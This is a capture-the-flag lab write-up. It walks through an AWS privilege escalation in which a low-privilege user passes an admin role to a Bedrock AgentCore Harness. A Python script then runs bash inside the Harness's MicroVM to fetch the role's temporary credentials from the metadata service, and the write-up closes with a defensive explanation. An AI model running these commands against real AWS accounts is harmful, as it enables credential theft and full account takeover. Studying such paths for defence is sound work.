# Solution: AgentCore Harness Creation to Admin

The bedrock-005 scenario exploits a privilege escalation path that exists whenever an IAM principal holds `iam:PassRole` on a privileged role and the full set of permissions needed to create and command a Bedrock AgentCore Harness. A Harness is an AWS-managed agent layer that sits on top of an underlying AgentCore Runtime. Unlike the bedrock-003 Runtime variant, a Harness requires no custom container image — AWS manages the container entirely. The attacker only needs to specify a Bedrock foundation model ID at creation time. Under the hood, AWS provisions a Firecracker MicroVM for the underlying Runtime. Like the Runtime variant, AWS assumes the Harness's execution role on its behalf and vends the resulting temporary credentials to any process running inside the MicroVM via the MicroVM Metadata Service (MMDS) at 169.254.169.254.

The `InvokeAgentRuntimeCommand` API provides a direct channel into the MicroVM, executing shell commands as root and bypassing the managed agent loop, the loaded model, and all guardrails entirely. Crucially, calling this API against the Harness ARN routes the command into the underlying Runtime's MicroVM — the model is never invoked by this attack.

This is the same PassRole attack surface as bedrock-003, but even simpler in practice: no Docker or ECR setup is required. Any principal that can create a Harness and invoke commands inside it effectively has sts:AssumeRole on any role that trusts `bedrock-agentcore.amazonaws.com`.

## The Challenge

You start as `pl-prod-bedrock-005-to-admin-starting-user`, an IAM user with a narrow set of permissions. You have `iam:PassRole` on the target admin role and the bedrock-agentcore permissions needed to create a Harness and invoke commands inside it. You cannot list IAM users, assume roles directly, or take any other privileged action in the account.

Your goal is to obtain credentials for `pl-prod-bedrock-005-to-admin-target-role`, an IAM role with `AdministratorAccess`. That role trusts `bedrock-agentcore.amazonaws.com` as a service principal, which means it can be passed to an AgentCore Harness as its execution role.

Set up your starting credentials:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
# arn:aws:iam::{account_id}:user/pl-prod-bedrock-005-to-admin-starting-user
```

Confirm you don't have admin access yet:

```bash
aws iam list-users --max-items 1
# AccessDenied
```

Good. No admin access yet.

## Reconnaissance

Use the helpful `iam:ListRoles` permission to discover the target role:

```bash
aws iam list-roles \
  --query 'Roles[?contains(RoleName, `bedrock-005`)].{Name:RoleName,Arn:Arn}' \
  --output table
```

You'll find `pl-prod-bedrock-005-to-admin-target-role`. Use `iam:GetRole` to inspect its trust policy:

```bash
aws iam get-role \
  --role-name pl-prod-bedrock-005-to-admin-target-role \
  --query 'Role.AssumeRolePolicyDocument'
```

The trust policy shows `bedrock-agentcore.amazonaws.com` as a trusted service principal. Any principal holding PassRole on this role can provision a Harness with this role as the execution role, causing AWS to assume it and expose credentials at the MMDS endpoint inside the Harness's MicroVM.

Capture the account ID and build the target role ARN now — you'll need both:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-bedrock-005-to-admin-target-role"
```

You also need a Bedrock foundation model ID. Check which models are enabled in your account:

```bash
aws bedrock list-foundation-models \
  --query 'modelSummaries[?modelLifecycle.status==`ACTIVE`].[modelId]' \
  --output text | head -5
```

Any active model works — the model is never actually invoked by this attack. A small, inexpensive model like `amazon.nova-micro-v1:0` is sufficient.

## Exploitation

The attack has three steps: create the Harness with the privileged execution role, wait for the underlying Runtime to reach READY state, then invoke a shell command to extract MMDS credentials.

### Step 1: Create the AgentCore Harness with the Privileged Role

Create the Harness using your starting user credentials. The `executionRoleArn` is what makes this attack work — you are passing the target admin role to the Harness, and `iam:PassRole` is what authorizes this. No container image is needed, and memory is disabled because the attack never uses the managed agent loop:

```bash
HARNESS_RESPONSE=$(aws bedrock-agentcore-control create-harness \
  --region us-east-1 \
  --harness-name bedrock-005-privesc-harness \
  --execution-role-arn "$TARGET_ROLE_ARN" \
  --model "{\"bedrockModelConfig\":{\"modelId\":\"amazon.nova-micro-v1:0\"}}" \
  --memory '{"disabled":{}}' \
  --output json)
```

The response nests the harness under a `harness` key. Keep both the ARN and the ID: the ARN is what you invoke, the ID is what you poll.

```bash
HARNESS_ARN=$(echo "$HARNESS_RESPONSE" | jq -r '.harness.arn')
HARNESS_ID=$(echo "$HARNESS_RESPONSE" | jq -r '.harness.harnessId')
echo "Harness ARN: $HARNESS_ARN"
echo "Harness ID : $HARNESS_ID"
```

### Step 2: Wait for READY State

The Harness provisions an underlying Runtime that needs 2–5 minutes to initialize. Poll `GetHarness` until the status reaches `READY`:

```bash
while true; do
  STATUS=$(aws bedrock-agentcore-control get-harness \
    --region us-east-1 \
    --harness-id "$HARNESS_ID" \
    --query 'harness.status' --output text)
  echo "Status: $STATUS"
  [ "$STATUS" = "READY" ] && break
  sleep 15
done
```

Once you see `READY`, the MicroVM is running and MMDS is serving credentials for the target role.

### Step 3: Invoke a Shell Command to Steal MMDS Credentials

Call `InvokeAgentRuntimeCommand` with a bash command that reads temporary credentials from MMDS. The Harness ARN can be used directly as the `agentRuntimeArn` — it routes the command into the underlying Runtime's MicroVM. The flow mirrors EC2 IMDSv2: first request a session token with a PUT, then use it to fetch the role name and the credential JSON. The response is an event stream, so read it with the SDK and reassemble the `stdout` content deltas. Save this as `read_mmds.py`:

```python
import boto3, sys, uuid

BASH_COMMAND = """bash -c '
TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
'"""

client = boto3.client("bedrock-agentcore", region_name="us-east-1")
response = client.invoke_agent_runtime_command(
    agentRuntimeArn=sys.argv[1],
    runtimeSessionId=str(uuid.uuid4()),
    body={"command": BASH_COMMAND, "timeout": 30},
)

for event in response["stream"]:
    chunk = event.get("chunk", {})
    if "contentDelta" in chunk and "stdout" in chunk["contentDelta"]:
        print(chunk["contentDelta"]["stdout"], end="")
```

Run it with the Harness ARN:

```bash
CREDS=$(python3 read_mmds.py "$HARNESS_ARN")
echo "$CREDS"
```

It prints the credentials JSON for the target admin role:

```json
{
  "Code": "Success",
  "LastUpdated": "...",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "..."
}
```

Extract and export the credentials:

```bash
export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Token')
```

## Verification

Confirm you are now operating as the admin role:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:sts::{account_id}:assumed-role/pl-prod-bedrock-005-to-admin-target-role/...
```

Verify administrator access by performing an action your original user could not:

```bash
aws iam list-users --max-items 3 --output table
# Returns a table of IAM users — you now have full admin access
```

## Capture the Flag

With admin credentials active, read the CTF flag from SSM Parameter Store. `AdministratorAccess` grants `ssm:GetParameter` on all parameters in the account, including the flag at `/pathfinding-labs/flags/bedrock-005-to-admin`. You are using the extracted MMDS credentials here — not reverting to your original user:

```bash
aws ssm get-parameter \
  --name /pathfinding-labs/flags/bedrock-005-to-admin \
  --query 'Parameter.Value' \
  --output text
```

The value printed is your scenario-specific flag.

## What Happened

You started with a low-privilege IAM user and a set of permissions scoped to Bedrock AgentCore management. By creating a new AgentCore Harness and passing your chosen privileged role to it — something `iam:PassRole` explicitly authorizes — you caused AWS to assume the admin role on behalf of the Harness's underlying Runtime. The Firecracker MicroVM that AWS provisioned then vended those credentials through MMDS, and `InvokeAgentRuntimeCommand` gave you a direct shell channel into that MicroVM to retrieve them.

The critical distinction from the bedrock-003 Runtime variant is that this attack requires no container image or ECR repository. The Harness uses an AWS-managed container; the attacker only specifies a model ID. This lowers the bar significantly — you don't need Docker or any attacker-controlled registry. The model ID requirement is a minor hurdle: any enabled model works, and the model itself is never invoked.

The bedrock-005 path also differs from bedrock-004 (attacking an existing Runtime) in that you control which role ends up in the MicroVM. You provision the target yourself rather than hunting for a pre-existing Runtime with a useful execution role.

In real environments this pattern appears wherever teams have granted `iam:PassRole` broadly to support agentic AI workflows, often justified with "it's just for AI tooling." The mental model "PassRole is fine as long as I don't give them sts:AssumeRole" breaks down as soon as there is a service that accepts an execution role, provisions compute, and makes credentials available from inside that compute. Bedrock AgentCore Harnesses join EC2, Lambda, ECS, Glue, SageMaker, and AgentCore Runtimes as services where PassRole on a privileged role is equivalent to that role being compromised — and this variant requires no custom infrastructure at all.
